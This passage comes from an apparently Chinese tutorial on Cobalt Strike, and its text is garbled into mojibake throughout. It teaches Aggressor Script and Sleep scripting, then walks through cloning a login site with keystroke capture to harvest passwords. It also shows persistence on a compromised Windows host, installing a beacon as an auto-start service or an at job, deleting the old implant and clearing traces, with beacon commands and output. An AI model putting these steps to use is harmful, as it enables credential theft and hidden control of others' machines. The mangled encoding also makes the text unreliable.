ï¼ˆ5ï¼‰lsæ˜¾ç¤ºæˆ‘ä»¬ç›®å‰åŠ è½½çš„cnaä»£ç  ï¼ˆ6ï¼‰proffç¦æ­¢cnaè„šæœ¬è¿è¡ŒSleepçš„è¯­æ³•ï¼ˆä¸æ˜ç™½å…·ä½“çš„ä½œç”¨ï¼‰ ï¼ˆ7ï¼‰profileç»Ÿè®¡cnaè„šæœ¬ä½¿ç”¨äº†å“ªäº›Sleepè¯­æ³• ï¼ˆ8ï¼‰pronè¿è¡Œcnaè„šæœ¬è¿è¡ŒSleepçš„è¯­æ³• ï¼ˆ9ï¼‰reloadé‡æ–°åŠ è½½cnaè„šæœ¬ï¼Œè¿˜æ˜¯ç”¨æˆ‘åˆšåˆšçš„cnaè„šæœ¬ä¸¾ä¾‹ï¼Œæˆ‘å…ˆä¿®æ”¹cnaä¸­çš„å†…å®¹ command w&#123; println(&quot;hello friend!&quot;);&#125; å†åˆ°æ§åˆ¶å°è¾“å‡ºä¸€ä¸‹ æ²¡æœ‰æ”¹å˜ï¼Œæˆ‘å†é‡è½½ä¸€ä¸‹å†è¿è¡Œ ï¼ˆ10ï¼‰troffå…³é—­å‡½æ•°è·Ÿè¸ªï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸æ˜¾ç¤ºå‡½æ•°è¿è¡Œçš„å…·ä½“æƒ…å†µ ï¼ˆ11ï¼‰tronå¼€å¯å‡½æ•°è·Ÿè¸ªï¼Œæ˜¾ç¤ºæˆ‘ä»¬è¿è¡Œæ—¶çš„å…·ä½“æƒ…å†µ å‘ç°æˆ‘ä»¬è¿è¡Œçš„æƒ…å†µï¼Œåœ¨t1.cnaçš„ç¬¬äºŒè¡Œï¼Œæˆ‘ä»¬è¾“å‡ºhello friend ï¼ˆ12ï¼‰xæ‰§è¡Œä¸€ä¸ªè®¡ç®—ï¼Œæ¯”å¦‚1 + 1ä»€ä¹ˆçš„ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ï¼Œä¸¤ä¸ªæ•°å­—ä¹‹é—´éœ€è¦é—´éš”å¼€ï¼Œä¸ç„¶ä¼šæŠ¥é”™ 3ã€ä½¿ç”¨ä¸å¸¦GUIçš„C2æˆ‘ä»¬å¯ä»¥ä½¿ç”¨agscript è¿è¡Œä¸€ä¸ªä¸ä½¿ç”¨GUIçš„C2å®¢æˆ·ç«¯ï¼Œç®€å•æ¥è¯´å°±æ˜¯å‘½ä»¤è¡Œçš„æ“ä½œ æœåŠ¡å™¨ä¸Šå¯åŠ¨åï¼Œåœ¨æœ¬åœ°è¾“å…¥ ./agscript [host] [port] [user] [password] 4ã€Sleepå¿«é€Ÿå…¥é—¨è¿™æ˜¯ä»–çš„æ•°æ®ç±»å‹ï¼Œé¦–å…ˆæˆ‘ä»¬è¦æ³¨æ„çš„æ˜¯ï¼Œä»–çš„æ ¼å¼æ˜¯ä¸€å®šéœ€è¦å¸¦ä¸Šç©ºæ ¼çš„ã€‚ æ•°å­—å­—ç¬¦ä¸²ArraysListsStacksSetsHashs$name = &quot;kris&quot;; # å­—ç¬¦ä¸²å˜é‡çš„å‘½å$age = 18; # æ•°å­—å‹å˜é‡å‘½åArraysç±»å‹ï¼š@user_list = @(&quot;kris&quot;,18,&quot;å››å·&quot;,&quot;å•èº«&quot;); # Sleepçš„é˜µåˆ—ï¼ˆåˆ—è¡¨ï¼‰æ˜¯ç±»ä¼¼pythonçš„é‚£ç§ä»»ä½•å…ƒç´ çš„é›†åˆï¼Œä¸éœ€è¦å…ƒç´ çš„ç±»å‹ç»Ÿä¸€ï¼Œå³ä¹Ÿæ˜¯ä¸€ç§å¤åˆæ•°æ®ç±»å‹ã€‚println(@name_list[0]); # ä¸‹æ ‡è¾“å‡ºä¿¡æ¯ Hashsç±»å‹%dict[&quot;name&quot;] = &quot;kris&quot;;%dict[&quot;age&quot;] = 18;%dict[&quot;address&quot;] = &quot;sichuan&quot;; # ä½¿ç”¨%å·åˆ›å»ºï¼Œæœ‰ç‚¹å’Œpythonçš„å­—å…¸ç±»ä¼¼ println(&quot;Dict is &quot;.%dict); ï¼ˆ1ï¼‰Arrays@arr1 = @(&#x27;a1&#x27;,&#x27;a2&#x27;,887);println(@arr1[1]); ï¼ˆ2ï¼‰Hashs$x = 2;%dic[&quot;key1&quot;] = &quot;value1&quot;;%dic[&quot;key2&quot;] = &quot;value2&quot;;%dic[$x] = &quot;value3&quot;;println(&quot;%dic is&quot;.%dic); ï¼ˆ3ï¼‰éå†@name_list = @(&#x27;kris&#x27;,18,&#x27;sichuan&#x27;);foreach $var (@name_list)&#123; println($var);&#125; ï¼ˆ4ï¼‰Pushè¿™ä¸ªç±»ä¼¼æˆ‘ä»¬çš„Pythonä¸­çš„appendæ–¹æ³•ï¼Œåœ¨åˆ—è¡¨çš„æœ€åé¢æ·»åŠ æ•°æ® @names = @(&quot;Hellen&quot;,&quot;Abao&quot;);push(@names,&quot;kris&quot;);println(&quot;name :&quot;.@names); ï¼ˆ5ï¼‰ç®€å•çš„äº¤äº’ç¨‹åºé¦–å…ˆå…ˆçœ‹ä»£ç  sub say_hello&#123; println(&quot;hello &quot;.$1);# å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œæ‰“å°hello + å¾—åˆ°çš„å‚æ•°&#125;command N &#123; say_hello($1); # å®šä¹‰ä¸€ä¸ªå‘½ä»¤ï¼Œå¹¶ä¸”å°†æ¥å—åˆ°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ç»™ say_helloå‡½æ•°ã€‚&#125; é¦–å…ˆä»‹ç»å®šä¹‰å‡½æ•°çš„æ–¹å¼ï¼Œåœ¨Sleepä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ sub è¿›è¡Œå‡½æ•°çš„å®šä¹‰ï¼Œæ¯”å¦‚æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªåŠ æ³•å‡½æ•°ï¼š sub add &#123; return $1.&quot;+&quot;.$2.&quot;=&quot;.($1 + $2);&#125;$sum = add(1,2);println($sum); commandå®šä¹‰å‘½ä»¤ è¯­æ³•ï¼š command &lt;ä½ æƒ³è¦çš„å‘½ä»¤&gt; &#123; æ‰§è¡Œçš„ä»£ç ; &#125; è¿™é‡Œæ˜¯æˆ‘ä»¬ä½¿ç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°è¿›è¡Œäº¤äº’çš„ï¼Œåœ¨ä¸Šé¢æˆ‘ä»¬æ˜¯ä½¿ç”¨çš„ N å»æ‰§è¡Œ say_helloçš„å‡½æ•°ä½“ï¼Œæˆ‘ä»¬ç°åœ¨åªä½¿ç”¨ä¸€ä¸ª command èµ·åˆ°ç›¸åŒçš„ä½œç”¨ï¼š command N &#123; println(&quot;hello &quot;.$1);&#125; è¿™é‡Œè¯´æ˜ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™å‡½æ•°ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨$1 æ˜¯æˆ‘ä»¬æ¥å—åˆ°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä»¥æ­¤ç±»æ¨ï¼š$2æ˜¯ç¬¬äºŒä¸ªå‚æ•°â€¦â€¦ ï¼ˆ6ï¼‰å½©è‰²è¾“å‡ºç®€å•çš„æ¥è¯´å°±æ˜¯è®©æˆ‘ä»¬çš„æ§åˆ¶å°è¾“å‡ºä¸€ä¸ªå¸¦é¢œè‰²çš„å­—ä½“ï¼š println(&quot;\\c0This is my color&quot;);println(&quot;\\c1This is my color&quot;); # è¿™æ˜¯é»‘è‰²println(&quot;\\c2This is my color&quot;);println(&quot;\\c3This is my color&quot;);println(&quot;\\c4This is my color&quot;);println(&quot;\\c5This is my color&quot;);println(&quot;\\c6This is my color&quot;);println(&quot;\\c7This is my color&quot;);println(&quot;\\c8This is my color&quot;);println(&quot;\\c9This is my color&quot;);println(&quot;\\cAThis is my color&quot;);println(&quot;\\cBThis is my color&quot;);println(&quot;\\cCThis is my color&quot;);println(&quot;\\cDThis is my color&quot;);println(&quot;\\cEThis is my color&quot;);println(&quot;\\cFThis is my color&quot;); 5ã€é”®ç›˜å¿«æ·é”®è¯­æ³•ï¼š bind &lt;æƒ³ç»‘å®šçš„ç»„åˆé”®&gt; &#123; æŒ‰ä¸‹å¿«æ·é”®æ‰§è¡Œçš„å‘½å; &#125; æˆ‘ä»¬ç»‘å®šä¸€ä¸ªæ¥è¯•è¯•çœ‹ï¼š bind Ctrl+H &#123; show_message(&quot;ä½¿ç”¨é”®ç›˜å¿«æ·é”®å“¦ï¼&quot;); # å¼¹çª—æ˜¾ç¤ºæˆ‘ä»¬çš„æ¶ˆæ¯ elog(&quot;ä½¿ç”¨äº†å¿«æ·é”®ï¼&quot;); # åœ¨ Event Logä½ç½®æ˜¾ç¤ºä¿¡æ¯&#125; å½“æˆ‘ä»¬ æŒ‰ä¸‹ Ctrl + H çš„ç»„åˆé”®çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±ç›´æ¥å¼¹å‡ºä¿¡æ¯ï¼Œå¹¶ä¸”æŒ‰ç…§ä»£ç ä¸€æ ·åœ¨ Event logä¸‹è¾“å‡ºï¼Œç»„åˆé”®å¯ä»¥éšä¾¿å†™ï¼Œä½ ä¹Ÿå¯ä»¥åªå†™ä¸€ä¸ª Hï¼Œéƒ½æ˜¯å¯ä»¥çš„ï¼ŒåŠ ä¸Š Ctrlåªæ˜¯çº¦å®šä¿—ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¯¹ä¸ªä¿®é¥°ç¬¦ï¼Œæ¯”å¦‚ Ctrl + Shift + Hã€‚ 6ã€èœå•ç¼–å†™èœå•å°±æ˜¯ä¸‹é¢è¿™æ ·çš„ä¸œè¥¿ï¼š æˆ‘ä»¬å¯ä»¥è‡ªå·±å®šä¹‰æƒ³è¦çš„èœå•æˆ–è€…å°†æˆ‘ä»¬çš„äºŒçº§èœå•æ·»åŠ åˆ°å·²ç»å­˜åœ¨çš„ä¸»èœå•ä¸‹ï¼Œåˆ›å»ºè‡ªå®šä¹‰èœå•è¯­æ³•å¦‚ä¸‹ï¼š popup &lt;èœå•å‡½æ•°å&gt;&#123; item(&quot;&amp;&lt;äºŒçº§èœå•æ˜¾ç¤º&gt;&quot;, &#123;ç‚¹å‡»æ—¶æ‰§è¡Œçš„ä»£ç ï¼Œæˆ–è€…å‡½æ•°&#125;); # ç¬¬ä¸€ä¸ªå­èœå• separator(); #åˆ†å‰²çº¿ item(&quot;&amp;&lt;äºŒçº§èœå•åå­—&gt;&quot;, &#123;ç‚¹å‡»æ—¶æ‰§è¡Œçš„ä»£ç ï¼Œæˆ–è€…å‡½æ•°&#125;); # ç¬¬äºŒä¸ªå­èœå• separator(); #åˆ†å‰²çº¿&#125;menubar(&quot;ä¸€çº§èœå•æ˜¾ç¤ºå&quot;, &quot;èœå•å‡½æ•°å&quot;); æˆ‘ä»¬ç°åœ¨å®šä¹‰ä¸€ä¸ªç®€å•çš„èœå• popup my_help&#123; item(&quot;&amp;è¿™æ˜¯ç™¾åº¦&quot;,&#123;url_open(&quot;http://www.baidu.com&quot;)&#125;); separator(); item(&quot;&amp;è¿™æ˜¯è°·æ­Œ&quot;,&#123;url_open(&quot;http://www.google.com&quot;)&#125;); # url_open()è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥æ‰“å¼€ç½‘ç«™çš„ &#125;menubar(&quot;å¸®åŠ©èœå•&quot;, &quot;my_help&quot;); # èœå•å‡½æ•°ï¼Œä¸€å®šè¦åŠ ä¸Š å½“æˆ‘ä»¬ç‚¹å‡»ä»¥åï¼Œä¼šç›´æ¥æ‰“å¼€ç™¾åº¦çš„é“¾æ¥ï¼š å¦‚æœæˆ‘ä»¬å¹¶ä¸æƒ³åˆ›å»ºæ–°çš„èœå•ï¼Œè€Œæ˜¯æƒ³åœ¨é»˜è®¤çš„èœå•ä¸Šå¢åŠ ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·åšï¼š popup help&#123; item(&quot;&amp;å…³äºæ±‰åŒ–&quot;,&#123;show_message(&quot;4.1æ±‰åŒ– by XXX &quot;)&#125;); separator();&#125; è¿™æ ·æˆ‘ä»¬å°±åœ¨ä¸åŸæœ‰çš„åŸºç¡€ä¸ŠåŠ ä¸Šäº†ä¸€ä¸ªå…³äºæ±‰åŒ–çš„æç¤ºï¼Œè¿™é‡Œæˆ‘ä»¬æ˜¯åŠ è½½å¤–éƒ¨çš„ cna ï¼Œä½ å¯ä»¥ä¿®æ”¹é»˜è®¤çš„ default.cnaæ¥æ·»åŠ è‡ªå·±çš„ä¿¡æ¯ã€‚ é™¤äº†ä¸Šé¢è¯´çš„é‚£æ ·çš„èœå•ï¼Œæˆ‘ä»¬è¿˜ä¼šåœ¨ç‚¹å‡»å³é”®çš„æ—¶å€™æ‰“å¼€èœå•ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š åˆ›å»ºè¿™æ ·çš„èœå•æˆ‘ä»¬çš„è¯­æ³•ä¸ºï¼š popup beacon_bottom&#123; item(&quot;&amp;å…³äºä½œè€…&quot;, &#123; url_open(&quot;https://wolke.cn&quot;); &#125;); &#125; æˆ‘ä»¬åœ¨ä»»ä½•çš„èœå•é‡Œé¢éƒ½å¯ä»¥åµŒå¥—èœå•ï¼Œå°±æ•´å‡ºä¸€ä¸ªå¤šçº§èœå•çš„æ ·å­ï¼Œæˆ‘ä»¬æŠŠä¸Šé¢çš„ä»£ç è¿›è¡Œä¿®æ”¹ popup beacon_bottom&#123; menu &quot;å…³äºä½œè€…&quot;&#123; item(&quot;&amp;åšå®¢&quot;, &#123; url_open(&quot;https://wolke.cn&quot;); &#125;); item(&quot;&amp;QQ&quot;, &#123; show_message(&quot;xxxxxx&quot;); &#125;); &#125; &#125; å¤šçº§èœå•å°±æ˜¯å¤šäº†ä¸€ä¸ªmenu â€œå³é”®æ˜¾ç¤ºçš„ä¿¡æ¯â€{} çš„å†™æ³•ï¼Œè¿™é‡Œå’Œä¸Šé¢èœå•ç¼–å†™æœ€å¤§çš„åŒºåˆ«å°±æ˜¯æ²¡æœ‰menubarçš„å†™æ³•ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯ç›´æ¥åœ¨å³é”®èœå•ä¸Šè¿›è¡Œä¿®æ”¹çš„ï¼Œä¹Ÿå°±æ˜¯åŸæœ‰èœå•ä¸Šä¿®æ”¹ 7ã€è¾“å‡ºæ¡†çš„ç¼–å†™åœ¨ä¸€äº›æ—¶å€™ï¼Œæˆ‘ä»¬æƒ³æ•´ä¸€ä¸ªè¾“å…¥æ¡†ã€‚è®©ç”¨æˆ·è¾“å…¥ä¸€äº›ä¸œè¥¿çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨ dialog æ•°æ®æ¨¡å‹è¿›è¡Œç¼–å†™ï¼Œä»–éœ€è¦æ¥å—ä¸‰ä¸ªå‚æ•° $1 å¯¹è¯æ¡†çš„åç§° $2 å¯¹è¯æ¡†é‡Œé¢çš„å†…å®¹ï¼Œå¯ä»¥å†™å¤šä¸ª $3 å›è°ƒå‡½æ•°ï¼Œå½“ç”¨æˆ·ä½¿ç”¨ dbutton_action è°ƒç”¨çš„å‡½æ•° popup test &#123; item(&quot;&amp;æ”¶é›†ä¿¡æ¯&quot;,&#123;dialog_test()&#125;); # å»ºç«‹ä¸€ä¸ªèœå•æ ç›®ï¼Œç‚¹å‡»æ”¶é›†ä¿¡æ¯æ—¶å°±è°ƒç”¨showå‡½æ•°&#125;menubar(&quot;æµ‹è¯•èœå•&quot;,&quot;test&quot;); # æ³¨å†Œèœå•sub show &#123; show_message(&quot;dialogçš„å¼•ç”¨æ˜¯ï¼š&quot;.$1.&quot;\\næŒ‰é’®åç§°æ˜¯ï¼š&quot;.$2); println(&quot;ç”¨æˆ·åæ˜¯ï¼š&quot;.$3[&quot;user&quot;].&quot;\\nå¯†ç æ˜¯ï¼š&quot;.$3[&quot;password&quot;]);# è¿™é‡Œshowå‡½æ•°æ¥æ”¶åˆ°äº†dialogä¼ é€’è¿‡æ¥çš„å‚æ•°ï¼Œåˆ†&#125;sub dialog_test &#123; $info = dialog(&quot;è¿™æ˜¯å¯¹è¯æ¡†çš„æ ‡é¢˜&quot;,%(username =&gt; &quot;root&quot;,password =&gt; &quot;&quot;),&amp;show); #ç¬¬ä¸€ä¸ªæ˜¯èœå•çš„åå­—ï¼Œç¬¬äºŒä¸ªæ˜¯æˆ‘ä»¬ä¸‹é¢å®šä¹‰çš„èœå•æ˜¾ç¤ºå†…å®¹çš„é»˜è®¤å€¼ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æˆ‘ä»¬å›è°ƒå‡½æ•°ï¼Œè§¦å‘showå‡½æ•°çš„æ—¶å€™æ˜¾ç¤ºï¼Œå¹¶å°†æˆ‘ä»¬çš„è¾“å…¥å€¼ä¼ é€’ç»™ä»– drow_text($info,&quot;user&quot;,&quot;è¾“å…¥ç”¨æˆ·åï¼š&quot;); # è®¾ç½®ä¸€ä¸ªç”¨æˆ·åè¾“å…¥æ¡ drow_text($info,&quot;password&quot;,&quot;è¾“å…¥å¯†ç &quot;); dbutton_action($info,&quot;é©¬ä¸Šèµ·é£ï¼&quot;); # ç‚¹å‡»æŒ‰é’®ï¼Œè§¦å‘å›è°ƒå‡½æ•° dbutton_help($info,&quot;https://wolke.cn&quot;); # æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ dialog_show($info); # æ˜¾ç¤ºæ–‡æœ¬è¾“å…¥æ¡†&#125; å®šä¹‰ diolog çš„æ—¶å€™ï¼Œä¼šå°†ç”¨æˆ·è¾“å…¥çš„ä¸œè¥¿ä¼ é€’ç»™ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®çš„å‡½æ•°ï¼Œdialogä¼ é€’çš„æ—¶å€™ä¸€å…±ä¼šä¼ é€’ä¸‰ä¸ªå‚æ•°ç»™å‡½æ•° $1 ä¸º dialogçš„å¼•ç”¨ $2 æŒ‰é’®çš„åç§° $3å¯¹è¯æ¡†è¾“å…¥çš„å€¼ drow_textæ˜¯æŒ‡æ–‡å¯¹è¯æ¡†çš„è¾“å…¥ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š drow_text(&quot;å˜é‡å&quot;,&quot;æç¤ºè¯­å¥&quot;); dbutton_action å°†æ“ä½œæŒ‰é’®æ·»åŠ åˆ°dialog ä¸­ï¼Œå½“ç‚¹å‡»è¿™ä¸ªæŒ‰é’®ä»¥åï¼Œä¼šå…³é—­å¯¹è¯æ¡†ï¼Œå¹¶ä¸”ä¼ è¾“æ•°æ®åˆ°å›è°ƒå‡½æ•°ä¸­ dbutton_action($info,&quot;æŒ‰é’®çš„åå­—&quot;) dbutton_help å°†helpæŒ‰é’®æ·»åŠ åˆ°å¯¹è¯æ¡†ä¸­ï¼Œç‚¹å‡»helpè·³è½¬ç½‘é¡µå» dbutton_help($info,&quot;https://wolke.cn&quot;) dialog_show æ˜¾ç¤ºå¯¹è¯æ¡† 8ã€æ•°æ®æ¥å£ Mode Function å«ä¹‰ targets å­˜å‚¨çš„ç›®æ ‡ä¿¡æ¯ æ˜¾ç¤ºä¸Šçº¿è¿‡çš„ä¸»æœºä¿¡æ¯ archives æ˜¾ç¤ºæœ€è¿‘çš„ä¿¡æ¯ æ˜¾ç¤ºæœ€è¿‘çš„è¾“å‡ºä¿¡æ¯ï¼ˆæ…ç”¨å¾ˆå¡ï¼‰ beacons æ˜¾ç¤ºæ‰€æœ‰çš„å—æ„ŸæŸ“çš„ä¸»æœºä¿¡æ¯ æ˜¾ç¤ºåœ¨çº¿å’Œä¸Šçº¿è¿‡çš„ä¸»æœº credentials æ˜¾ç¤ºå‡­æ®ä¿¡æ¯ æˆ‘ä»¬æŠ“å–è¿‡çš„å¯†ç ä¿¡æ¯å’Œåˆ¶ä½œçš„ç¥¨æ®ä¿¡æ¯ downloads æ˜¾ç¤ºä¸‹è½½ä¿¡æ¯ æ˜¾ç¤ºæˆ‘ä»¬åœ¨å—æ§ç«¯ä¸‹è½½çš„ä¿¡æ¯ keystrokes è®°å½•é”®ç›˜è¾“å…¥ å½“æˆ‘ä»¬é€‰æ‹©è¿›ç¨‹è®°å½•é”®ç›˜çš„æ—¶å€™ï¼Œä¼šå°†å¾—åˆ°çš„é”®ç›˜ä¿¡æ¯è®°å½•ä¸‹æ¥ screenshots å±å¹•æˆªå›¾æ˜¾ç¤º æ˜¾ç¤ºæˆ‘ä»¬æˆªå›¾çš„äºŒè¿›åˆ¶ä¿¡æ¯æµ sites æ‰˜ç®¡çš„èµ„äº§ çœ‹èµ·æ¥æ˜¯æˆ‘ä»¬åˆ›å»ºçš„ç›‘å¬çš„ç«¯å£ä¸ªStagerå›è¿çš„ç«¯å£ servers ä¸Šé¢çš„è¿™äº›æ•°æ®ç»“æ„ï¼ˆå¯ä»¥ç†è§£ä¸ºå‡½æ•°ï¼‰ä½¿ç”¨ä»–ä»¬å¯ä»¥è¿”å›å¯¹åº”çš„ä¿¡æ¯ï¼Œä»¥æ•°ç»„çš„å½¢å¼è¿”å›ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ Aggressor Scriptçš„æ§åˆ¶å°è¿›è¡ŒæŸ¥çœ‹ï¼Œä¾‹å¦‚ï¼š æ”¯æŒä¸‹æ ‡ç´¢å¼•ï¼š å­—å…¸çš„æ“ä½œä¹Ÿå¯ä»¥ æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ª cna æ¥è·å–å½“å‰ä¸»æœºçš„ä¿¡æ¯ï¼š command info&#123; println(&quot;IPåœ°å€ï¼š&quot;.targets()[$1][&quot;address&quot;].&quot;\\næ“ä½œç³»ç»Ÿï¼š&quot;.targets()[$1][&quot;os&quot;].&quot;\\nç”¨æˆ·åï¼š&quot;.targets()[$1][&quot;name&quot;]);&#125; ä¹ã€åˆ¶ä½œé’“é±¼ç½‘ç«™1ã€å¯»æ‰¾ç½‘ç«™æ¨¡æ¿æ‰¾æœ‰ç™»å½•æ¡†çš„æˆ–è€…ä½ æƒ³å…‹éš†çš„ç½‘ç«™ 2ã€CSå…‹éš†ç½‘ç«™ï¼Œå¹¶å¼€å§‹è¾“å…¥ç›‘å¬ å¡«å†™å…‹éš†åœ°å€ï¼Œå‹¾é€‰é”®ç›˜ç›‘å¬ 3ã€è®¿é—®æµ‹è¯•åœ¨é’“é±¼é¡µé¢è¾“å…¥è´¦å·å¯†ç  ç‚¹å‡»ç™»å½•åï¼Œå…¶å®æ˜¯å¾€çœŸå®çš„é¡µé¢æäº¤è´¦å·å¯†ç ï¼Œå¦‚æœè¾“å…¥æ­£ç¡®ï¼Œåˆ™è¿›å…¥åå°ï¼Œè¾“å…¥é”™è¯¯ï¼Œå›åˆ°ç™»å½•é¡µé¢ï¼ˆå¦‚ä¸‹å›¾ï¼‰ çœ‹åˆ°ç”¨æˆ·è¾“å…¥çš„è´¦å·å¯†ç  åã€æƒé™ç»´æŒå¦‚æœæ­¤æ—¶æˆ‘å·²ç»æ§åˆ¶äº†ç”µè„‘ï¼Œä½†ç”±äºæœ¨é©¬è¿è¡Œåœ¨å†…å­˜ä¸­ï¼Œå½“ç”¨æˆ·åˆ é™¤è¯¥æ–‡ä»¶æ—¶ä¼šæŠ¥é”™æ— æ³•åˆ é™¤ï¼Œå®¹æ˜“æš´éœ²ã€‚è€Œä¸”å½“ç”¨æˆ·é‡å¯ç”µè„‘æ—¶ï¼Œä¹Ÿä¼šæ–­å¼€æ§åˆ¶ï¼Œæ­¤æ—¶å°±éœ€è¦è¿›è¡Œæƒé™ç»´æŒï¼Œè€Œè¿™é‡Œæˆ‘ä»¬é€šè¿‡æœåŠ¡è¿›è¡Œæƒé™ç»´æŒ 1ã€åˆ›å»ºå¯æ‰§è¡Œæ–‡ä»¶åˆ›å»ºå¯æ‰§è¡Œæ–‡ä»¶å¯ä»¥åœ¨ Cobalt Strike çš„ Attack -&gt; Packages -&gt; Windows Executable(s) å¤„è¿›è¡Œåˆ›å»ºï¼Œåˆ›å»ºä¸€ä¸ªw01ke.exeæ–‡ä»¶ å¦‚æœç”¨äºå†…ç½‘ä¸­çš„æ¨ªå‘ç§»åŠ¨ï¼Œé‚£ä¹ˆå¼ºçƒˆå»ºè®®ä½¿ç”¨ SMB Beaconï¼ŒSMB Beacon å°±æ˜¯ä¸ºäº†å†…ç½‘æ¨ªå‘æ‰©å±•æ¸—é€è€Œè®¾è®¡çš„ã€‚ 2ã€ä¸Šä¼ å¯æ‰§è¡Œæ–‡ä»¶é¦–å…ˆä½¿ç”¨ Cobalt Strike ä¸Šçš„ upload åŠŸèƒ½ä¸Šä¼ æ–‡ä»¶ï¼Œæ¥ç€å¤åˆ¶æ–‡ä»¶åˆ°ç›®æ ‡ä¸»æœºçš„å…¶ä»–ä½ç½®ã€‚ beacon&gt; cd c:\\windows\\tempbeacon&gt; upload /root/w01ke.exe[*] Tasked beacon to upload /home/kali/w01ke.exe as w01ke.exe[+] host called home, sent: 289301 bytes 3ã€æ‰§è¡Œæ–‡ä»¶ï¼ˆ1ï¼‰æ–¹æ³•ä¸€ï¼šæœåŠ¡æƒé™ç»´æŒâ‘  ç”ŸæˆWindows Service EXEå¹¶ä¸Šä¼ å°±æ˜¯ä¸Šé¢ç”Ÿæˆçš„exeï¼Œç»§ç»­å³å¯ â‘¡ åœ¨ç›®æ ‡ä¸»æœºä¸Šåˆ›å»ºä¸€ä¸ªæœåŠ¡beacon&gt; shell sc [\\\\ç”¨æˆ·å] create &quot;thisserver&quot; binpath= &quot;c:\\windows\\temp\\w01ke.exe&quot;ç­‰å·å’Œå€¼ä¹‹é—´éœ€è¦æœ‰ä¸ªç©ºæ ¼ å¦å¤–è¿˜å¯ä»¥ä¿®æ”¹æœåŠ¡æè¿° beacon&gt; shell sc [\\\\ç”¨æˆ·å] description &quot;thisserver&quot; &quot;zhe shi fu wu&quot; â‘¢ è®¾ç½®å¼€æœºè‡ªå¯åŠ¨beacon&gt; shell sc [\\\\ç”¨æˆ·å] config &quot;thisserver&quot; start= auto â‘£ åœ¨ç›®æ ‡æœºå¯åŠ¨æœåŠ¡beacon&gt; shell sc start thisserveræˆ–è€…beacon&gt; shell net start thisserver æ­¤æ—¶å°±ä¼šæœ‰ä¸ªæ–°ç›®æ ‡ä¸Šçº¿ â‘¤ æ¸…é™¤æ—§æœ¨é©¬ becon.exebeacon&gt; shell del C:\\Users\\Administrator\\Desktop\\beacon.exe[*] Tasked beacon to run: del C:\\Users\\Administrator\\Desktop\\beacon.exe[+] host called home, sent: 76 bytes â‘¥ éªŒè¯å¼€æœºè‡ªå¯æœåŠ¡æ­¤æ—¶é‡å¯ç›®æ ‡æœºå™¨ï¼Œæœ‰æ–°è¿æ¥ â‘¦ æ¸…é™¤ç—•è¿¹ä¸æœåŠ¡beacon&gt; shell del C:\\windows\\temp\\w01ke.exe[*] Tasked beacon to run: del C:\\windows\\temp\\w01ke.exe[+] host called home, sent: 83 bytesbeacon&gt; shell sc delete &quot;thisserver&quot;[*] Tasked beacon to run: sc delete &quot;thisserver&quot;[+] host called home, sent: 69 bytes[+] received output:[SC] DeleteService æˆåŠŸ ï¼ˆ2ï¼‰æ–¹æ³•äºŒï¼šè®¡åˆ’ä»»åŠ¡ç»´æŒâ‘  ç”ŸæˆWindows EXEå¹¶ä¸Šä¼ æ³¨æ„è¿™é‡Œç”Ÿæˆçš„ EXE å’Œæ–¹æ³•ä¸€ç”Ÿæˆçš„ EXE æ˜¯ä¸ä¸€æ ·çš„ç±»å‹ï¼Œè¿™é‡Œç”Ÿæˆçš„æ˜¯Windows EXEï¼Œä¸æ˜¯æ–¹æ³•ä¸€ä¸­çš„Windows Service EXEã€‚ ä¸Šä¼ åå°†w01ke2.exeç§»åŠ¨åˆ°c:\\windows\\temp\\ç›®å½•ä¸‹ â‘¡ æ‰¾åˆ°ç›®æ ‡ç³»ç»Ÿä¸Šçš„æ—¶é—´beacon&gt; shell net time[*] Tasked beacon to run: net time[+] host called home, sent: 39 bytes[+] received output:æ‰¾ä¸åˆ°æ—¶é—´æœåŠ¡å™¨ã€‚è¯·é”®å…¥ NET HELPMSG 3912 ä»¥è·å¾—æ›´å¤šçš„å¸®åŠ©ã€‚beacon&gt; shell net start &quot;windows time&quot;[*] Tasked beacon to run: net start &quot;windows time&quot;[+] host called home, sent: 55 bytes[+] received output:è¯·æ±‚çš„æœåŠ¡å·²ç»å¯åŠ¨ã€‚è¯·é”®å…¥ NET HELPMSG 2182 ä»¥è·å¾—æ›´å¤šçš„å¸®åŠ©ã€‚ ä¸æ‡‚å¼€äº†ä½†æ˜¯è¿˜æ˜¯ä¸è¡Œã€‚è¿™é‡Œå°±å½“ä½œå¼€äº†ï¼ŒçŸ¥é“äº†æ—¶é—´ä¸º2022/02/18å§ â‘¢ åˆ›å»ºä¸€ä¸ªè®¡åˆ’ä»»åŠ¡beacon&gt; shell at 2:02 c:\\windows\\temp\\w01ke2.exe[*] Tasked beacon to run: at 2:02 c:\\windows\\temp\\w01ke2.exe[+] host called home, sent: 65 bytes[+] received output:æ–°åŠ äº†ä¸€é¡¹ä½œä¸šï¼Œå…¶ä½œä¸š ID = 1 â‘£ éªŒè¯å½“åˆ°äº†è§„å®šæ—¶é—´åï¼Œç›®æ ‡æœºå™¨ä¸Šçº¿ åä¸€ã€CSæ­£å‘è¿æ¥å¤šå±‚å†…ç½‘è¿™æ˜¯æºè‡ªç½‘ç»œä¸Šçš„ä¸€å¼ æ¦‚å¿µå›¾ï¼Œå¤§è‡´åŸç†å¦‚å›¾æ‰€ç¤º é¦–å…ˆè·³æ¿æœºä¸Šå·²ç»æœ‰äº† cs 